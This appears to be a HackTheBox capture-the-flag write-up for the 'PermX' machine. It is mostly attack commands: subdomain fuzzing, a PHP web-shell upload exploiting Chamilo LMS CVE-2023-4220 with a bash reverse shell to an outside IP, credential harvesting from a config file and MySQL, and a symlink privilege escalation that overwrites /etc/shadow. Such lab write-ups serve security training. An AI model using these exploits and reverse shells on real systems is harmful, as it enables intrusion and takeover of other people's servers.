---
title: HTB - PermX
description: HTB - PermX
publishDate: 2023-06-07
categories:
  - HackTheBox
tags:
  - HackTheBox
  - Chamilo-LMS
  - CVE-2023-4220
  - mysql
  - symlink
  - curl

---

## Box Info

| Name                  | Bizness          | 
| :-------------------- | ---------------: |
| Release Date          | 20 Jun, 2024     |
| OS                    | Linux            |
| Rated Difficulty      | Easy             |

## Enumeration

### Nmap

![Image](image.png)

#### whatweb:

![Image](2.png)

#### Wappalyzer

![Image](4.png)

### Web

![Image](3.png)

#### Brute Forcing directory

I use

```bash
dirsearch -u http://permx.htb/
```

 but i dont find anything interesting, So i use the Scan for Subdomain

#### SubDomain

```bash
wfuzz -c -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt --hc 400,403,404,302 -H "Host: FUZZ.permx.htb" -u http://permx.htb -t 100
```

![Image](5.png)

Search for chamilo in google.

### Chamilo LMS - CVE-2023-4220

![Image](6.png)

RCE:
```bash
echo '<?php system("bash -c 'bash -i >& /dev/tcp/10.10.10.13/9001 0>&'"); ?>' > rce.php
```

```bash
curl -F 'bigUploadFile=@rce.php' 'http://<chamilo>/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
`The file has successfully been uploaded.`
```

```bash
curl 'http://<chamilo>/main/inc/lib/javascript/bigupload/files/rce.php'
`uid=33(www-data) gid=33(www-data) groups=33(www-data)`
```

![Image](7.png)

We go to open the file through web.

![Image](8.png)

Execute the file .php `http://lms.permx.htb//main/inc/lib/javascript/bigupload/files/rce.php` with `lvwrap nc -lvnp 7777` listening for get the reverse shell

![Image](9.png)

taadaaa... Well, we login as `www-data` and we go to enumerate... 
I found in config folder a file `configuration.php` and show it us a user and password.

Till now we have one user:`chamilo` and password:`03f6lY3uXAP2...`.

![Image](10.png)

`netstat -nlp` or `netstat -ano` and we see one port strange and is port 3306 it is open for the database.

![Image](11.png)

Use the mysql inside in the victim machine.

```bash
mysql -uchamilo -p and the password 03F6lY3uXAP2bkW8
```
![Image](12.png)

```text
show databases;
use chamilo;
describe user;
select user_id,username,firstname,lastname,password,salt from user;
```

![Image](13.png)

We login with ssh `mtz@permx.htb` and password `03F6lY3uXAP2bkW8`

![Image](14.png)

`sudo -l`

![Image](15.png)

## Symlink (Symbolic Link Attack)

The directory `/etc/init.d`{: .filepath} is home to **scripts** for System V init (SysVinit), the **classic Linux service management system**. It includes scripts to `start`, `stop`, `restart`, and sometimes `reload` services. These can be executed directly or through symbolic links found in `/etc/rc?.d/`{: .filepath}. An alternative path in Redhat systems is `/etc/rc.d/init.d`{: .filepath}.

Its main function is to change all file permissions, but it must be in the `/home/mtz` directory.

![Image](16.png)

[Symlink Español](https://www.freecodecamp.org/espanol/news/tutorial-de-enlace-simbolico-en-linux-como-crear-y-remover-un-enlace-simbolico/)
[Symlink Hacktricks](https://book.hacktricks.xyz/pentesting-web/file-upload#symlink)

```bash
link soft / to cc
ln -s / cc
```

Create a folder that points to the root path with Symlink with the -s (soft) option to locate ourselves inside it and make changes to `/etc/shadow`{: .filepath} (root password) with a password that we create ourselves (cccc).

![Image](17.png)

The `/etc/shadow`{: .filepath} storage the password of root

```bash
sudo /opt/acl.sh mtz rwx /home/mtz/etc/shadow (execute the script for change the permissions)
```

![Image](18.png)

Generated a password for remplace the root password in `/etc/shadow`{: .filepath}

```bash
openssl passwd -6 cccc
```

![Image](19.png)

and copy and paste en the file `"shadow"`

```bash
echo 'root: {password generate}:19871:0:99999:7:::' > /home/mtz/cc/etc/shadow
```
Login as root with password cccc

![Image](20.png)

`Root`